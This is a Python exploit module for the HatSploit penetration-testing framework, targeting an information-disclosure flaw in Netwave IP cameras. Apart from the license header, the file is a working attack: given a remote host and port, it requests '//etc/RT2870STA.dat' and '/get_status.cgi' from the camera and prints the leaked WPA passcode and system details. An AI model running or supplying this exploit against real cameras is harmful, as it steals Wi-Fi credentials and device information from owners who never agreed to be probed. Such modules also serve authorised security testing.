#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import os
import binascii
import subprocess

from core.badges import badges
from core.parser import parser

from utils.web_tools import web_tools
from utils.string_tools import string_tools

class HatSploitModule:
    def __init__(self):
        self.badges = badges()
        self.parser = parser()
        
        self.web_tools = web_tools()
        self.string_tools = string_tools()
        
        self.details = {
            'Name': "exploit/multi/netwave_ip_camera/information_disclosure",
            'Authors': [
                'enty8080'
            ],
            'Description': "Netwave IP Camera information disclosure exploit.",
            'Dependencies': [
                ''
            ],
            'Comments': [
                ''
            ],
            'Risk': "high"
        }
        
        self.options = {
            'RHOST': {
                'Description': "Remote host.",
                'Value': None,
                'Required': True
            },
            'RPORT': {
                'Description': "Remote port.",
                'Value': 81,
                'Required': True
            }
        }
        
    def exploit(self, remote_host, remote_port):
        target_url = self.web_tools.craft_url(remote_host, remote_port)
        
        if not self.web_tools.check_url_access(target_url):
            self.badges.output_error("Exploit failed!")
            return
        
        self.badges.output_process("Checking for information leak...")
        payload1, payload2 = '//etc/RT2870STA.dat', '/get_status.cgi'
        
        response1 = self.web_tools.http_request("GET", target_url, payload1)
        response2 = self.web_tools.http_request("GET", target_url, payload2)
        
        if response1.status_code != 200 and response2.status_code != 200:
            self.badges.output_error("No information leak found!")
            self.badges.output_error("Exploit failed!")
            return
        
        self.badges.output_process("Searching for leaked WPA passcode...")
        
        if response1.status_code == 200:
            self.badges.output_success("Found leaked WPA passcode!")
            self.badges.output_information("Leaked WPA passcode in this dump:")
            self.badges.output_empty(response1.text.strip())
        else:
            self.badges.output_warning("No leaked WPA passcode found.")
        
        self.badges.output_process("Searching for leaked system information...")
        
        if response2.status_code == 200:
            self.badges.output_success("Found leaked system information!")
            self.badges.output_information("Leaked system information:")
            self.badges.output_empty(response2.text.strip())
        else:
            self.badges.output_warning("No leaked system information found.")
    
    def run(self):
        remote_host, remote_port = self.parser.parse_options(self.options)
        
        target = self.web_tools.format_host_and_port(remote_host, remote_port)
        self.badges.output_process("Exploiting " + target + "...")
        
        self.exploit(remote_host, remote_port)
